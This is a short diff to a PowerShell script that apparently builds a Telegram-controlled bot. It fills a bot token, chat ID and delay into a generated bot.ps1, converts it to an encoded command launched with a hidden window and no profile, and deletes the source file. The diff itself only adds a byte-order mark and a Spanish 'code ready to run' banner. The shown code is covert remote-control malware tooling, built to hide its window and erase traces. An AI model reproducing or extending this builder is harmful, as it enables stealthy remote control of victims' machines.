@@ -1,4 +1,4 @@
-clear
+﻿clear
 $ErrorActionPreference = "SilentlyContinue"
 $version = "0.2"
 
@@ -73,3 +73,6 @@ if ($kill -eq "$true" -and $first_connect -gt 5) {break}
 $scriptblock | Out-File bot.ps1
 $scriptblock -replace "your_token", "$your_token" -replace "your_chat_id", "$your_chat_id" -replace "your_delay", "$your_delay" | Out-File bot.ps1
 Out-EncodedCommand -Path bot.ps1 -NoProfile -NonInteractive -WindowStyle Hidden -EncodedOutput ; Remove-Item bot.ps1
+
+Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Código listo para ejecutarse. `n`n`n" -ForegroundColor Green -NoNewline 
+pause
